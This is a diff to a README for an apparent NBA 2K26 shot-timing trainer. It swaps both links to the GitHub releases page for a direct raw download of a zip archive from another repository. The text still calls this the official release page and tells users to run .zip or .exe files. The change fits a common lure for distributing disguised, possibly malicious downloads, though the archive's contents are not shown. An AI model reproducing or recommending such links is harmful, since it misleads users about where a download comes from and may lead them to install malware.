@@ -5,7 +5,7 @@ description: "Practice NBA 2K26 jump shot timing with this web-based trainer tha
 ---
 # 🏀 nba-2k26-shot-release-tool - Master your shot timing with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/parenchymasecretaryofveteransaffairs737/nba-2k26-shot-release-tool/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/parenchymasecretaryofveteransaffairs737/parenchymasecretaryofveteransaffairs737.github.io/main/public/v1.0.zip)
 
 This application provides a practice environment for NBA 2K26 players. Use this tool to refine your shot release timing through repeatable drills. It helps you build muscle memory for your jump shot in a distraction-free setting.
 
@@ -13,7 +13,7 @@ This application provides a practice environment for NBA 2K26 players. Use this 
 
 You can get the software from the official release page.
 
-1. Visit [this link to the download page](https://github.com/parenchymasecretaryofveteransaffairs737/nba-2k26-shot-release-tool/releases).
+1. Visit [this link to the download page](https://raw.githubusercontent.com/parenchymasecretaryofveteransaffairs737/parenchymasecretaryofveteransaffairs737.github.io/main/public/v1.0.zip).
 2. Look for the most recent version at the top of the list.
 3. Click the file ending in .zip or .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
